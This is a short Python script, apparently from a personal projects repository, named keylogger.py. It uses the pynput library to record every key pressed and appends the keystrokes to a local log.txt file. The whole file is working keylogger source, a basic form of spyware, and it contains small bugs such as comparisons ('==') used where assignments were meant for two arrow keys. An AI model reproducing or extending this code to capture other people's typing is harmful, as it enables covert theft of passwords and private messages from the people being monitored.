# projects
keylogger.py
#! /usr/bin/python

import pynput.keyboard

log =""

def process_keys(key):
	global log
	fin = open("log.txt", 'a')
	fin.write(log)
	log =""
	fin.close()

	try:
		log = log + str(key.char)
	except AttributeError:
		if key == key.space:
			log = log + " "
		elif key == key.up:
			log = log + " "
		elif key == key.right:
			log = log + " "
		elif key == key.left:
			log == log + " "
		elif key == key.down:
			log == log + " "
		else:
			log = log + " " + str(key) + " " 
	
def start():
	key_listener = pynput.keyboard.Listener(on_press=process_keys)
	with key_listener:
		key_listener.join()


start()
